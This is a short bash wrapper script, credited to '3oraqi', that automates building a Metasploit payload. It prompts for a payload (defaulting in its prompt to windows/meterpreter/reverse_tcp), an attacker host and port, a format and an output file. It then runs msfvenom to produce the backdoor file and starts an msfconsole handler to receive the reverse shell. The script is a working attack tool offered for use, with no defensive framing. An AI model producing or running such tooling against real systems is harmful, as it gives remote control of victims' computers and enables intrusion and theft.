#!/bin/bash

function a {
figlet 3oraqi
sleep 5
echo "Coded By 3oraqi"
sleep 5
echo "wait a few seconds .."
sleep 5
read -p " windows/meterpreter/reverse_tcp .. :# " pay
read -p " enter LHOST ,, :# " lhost
read -p " enter LPORT .. :# " lport
read -p " enter format file ..;# " format
read -p " enter out file ..:# " out

xterm -e "msfvenom -p $pay LHOST=$lhost LPORT=$lport -f $format -o $out"
 }
a


function b {
msfconsole -q -x "handler -p $pay -H $lhost -P $lport"
}
b
